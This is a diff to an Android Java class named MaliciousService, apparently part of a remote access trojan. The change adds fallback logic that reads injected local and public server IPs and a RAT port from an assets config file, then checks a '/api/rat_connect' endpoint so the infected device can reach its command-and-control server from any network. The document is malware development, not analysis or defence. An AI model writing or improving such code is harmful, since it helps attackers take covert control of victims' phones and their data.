@@ -267,13 +267,32 @@ public class MaliciousService extends Service {
             Properties props = new Properties();
             props.load(is);
             is.close();
-            String injectedIp = props.getProperty("SERVER_IP");
+            String localIp = props.getProperty("LOCAL_IP");
+            String publicIp = props.getProperty("PUBLIC_IP");
             String injectedFlaskPort = props.getProperty("FLASK_PORT");
             String injectedRatPort = props.getProperty("RAT_PORT");
             
-            if (injectedIp != null && !injectedIp.isEmpty() && injectedFlaskPort != null && !injectedFlaskPort.isEmpty()) {
-                Log.d(TAG, "Config injected from assets/config.ini: IP=" + injectedIp + ", Flask Port=" + injectedFlaskPort + ", RAT Port=" + injectedRatPort);
-                saveServerConfigToPreferences(injectedIp, injectedFlaskPort, injectedRatPort);
+            // First try to use local IP (same WiFi)
+            if (localIp != null && !localIp.isEmpty() && injectedFlaskPort != null && !injectedFlaskPort.isEmpty()) {
+                Log.d(TAG, "Trying local IP first: " + localIp + ":" + injectedFlaskPort);
+                saveServerConfigToPreferences(localIp, injectedFlaskPort, injectedRatPort);
+                
+                // Schedule a check to try public IP if local fails
+                Handler handler = new Handler();
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if (!isServerReachable(localIp, injectedFlaskPort) && publicIp != null && !publicIp.isEmpty()) {
+                            Log.d(TAG, "Local IP unreachable, switching to public IP: " + publicIp);
+                            saveServerConfigToPreferences(publicIp, injectedFlaskPort, injectedRatPort);
+                        }
+                    }
+                }, 5000); // Wait 5 seconds before checking
+            } 
+            // If no local IP or it's empty, try public IP directly
+            else if (publicIp != null && !publicIp.isEmpty() && injectedFlaskPort != null && !injectedFlaskPort.isEmpty()) {
+                Log.d(TAG, "Using public IP: " + publicIp + ":" + injectedFlaskPort);
+                saveServerConfigToPreferences(publicIp, injectedFlaskPort, injectedRatPort);
             } else {
                 Log.w(TAG, "Injected config.ini found but IP/Flask Port are missing or empty.");
             }
@@ -281,6 +300,21 @@ public class MaliciousService extends Service {
             Log.w(TAG, "config.ini not found in assets, or error reading it: " + e.getMessage());
         } catch (Exception e) {
             Log.e(TAG, "Error processing injected config from assets: " + e.getMessage());
+        }
+    }
+    
+    private boolean isServerReachable(String ip, String port) {
+        try {
+            URL url = new URL("http://" + ip + ":" + port + "/api/rat_connect");
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setConnectTimeout(3000); // 3 seconds timeout
+            connection.setRequestMethod("GET");
+            int responseCode = connection.getResponseCode();
+            connection.disconnect();
+            return responseCode == 200;
+        } catch (Exception e) {
+            Log.d(TAG, "Server not reachable at " + ip + ":" + port + " - " + e.getMessage());
+            return false;
         }
     }
 
